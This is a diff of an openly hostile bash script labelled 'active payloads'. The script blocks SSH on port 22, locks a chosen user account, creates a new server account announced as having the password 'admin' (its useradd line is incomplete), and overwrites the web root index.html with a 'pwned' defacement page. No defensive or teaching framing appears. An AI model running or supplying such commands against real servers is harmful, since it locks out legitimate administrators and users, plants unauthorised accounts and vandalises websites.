@@ -4,7 +4,8 @@
 #------------------------Warning: active payloads-------------------------------------------------
 # port blocker
 # webpage destroyer
-# Password changer
+# account blocker
+# new account creator
 # ftp infector
 # overall bad day creator
 
@@ -19,44 +20,50 @@ echo "--------------------------------BEGINING ATTACK---------------------------
 echo "------------------------------BLOCKING PORT 22 (SSH)----------------------------"
 
 echo ""
-ufw block 22/all
+ufw deny 22/tcp
+ufw deny 22/udp
 sleep 2
 echo "-----------------------------------DONE------------------------------------------"
 
 echo ""
-echo "----------------------------LOCKING CURRENT ACCOUNT----------------------------"
+echo "----------------------------LOCKING USER ACCOUNT----------------------------"
 
-echo""
+echo ""
+echo "Enter account name to be locked"
+read accountName
+sleep 1
 
-usermod -L $USER
+usermod -L $accountName
 
-sleep 4
 
-echo"--------------------------------------DONE----------------------------------------"
 
-echo""
+echo "--------------------------------------DONE----------------------------------------"
 
-echo"-----------------------------ADD NEW ACCOUNT TO SERVER-----------------------------"
+echo ""
 
-echo""
+echo "-----------------------------ADD NEW ACCOUNT TO SERVER-----------------------------"
 
-echo"Enter new username"
+echo ""
+
+echo "Enter new username"
 read username
 
 useradd -m $username -p 
 
-sleep 2
+sleep 1
 
-echo"New user"
-echo  $username 
-echo"with password"
-echo"admin"
-echo"created"
+echo "New user:"  $username
+echo "with password: admin"
+echo "created"
 
-echo"----------------------------------NEW ACCOUNT CREATED-------------------------------"
-echo""
-echo"----------------------------------DISMEMBERING WEBPAGE------------------------------"
-echo"<!DOCTYPE html>"> /var/www/html/index.html
-echo"<html><head><title>^&HSD's website</title></head>">> /var/www/html/index.html
-echo"<body><h1>W3lc0m3 t0 j4ck's W3bs1t3</h1>" >>/var/www/html/index.html
-echo"<p>This website has been pwned by 3^*#@dsa32</P></html>" >>/var/www/html/kindex.html
+sleep 3
+
+echo "----------------------------------NEW ACCOUNT CREATED-------------------------------"
+echo ""
+echo "----------------------------------DISMEMBERING WEBPAGE------------------------------"
+
+echo "<html><head><title>^&HSD's website</title></head>" > /var/www/html/index.html
+echo "<body><h1>W3lc0m3 t0 j4ck's W3bs1t3</h1>" >> /var/www/html/index.html
+echo "<p>This website has been pwned by 3^*#@dsa32</P></html>" >> /var/www/html/kindex.html
+
+echo "----------------------------------WEBPAGE DISMEMBERED-------------------------------"
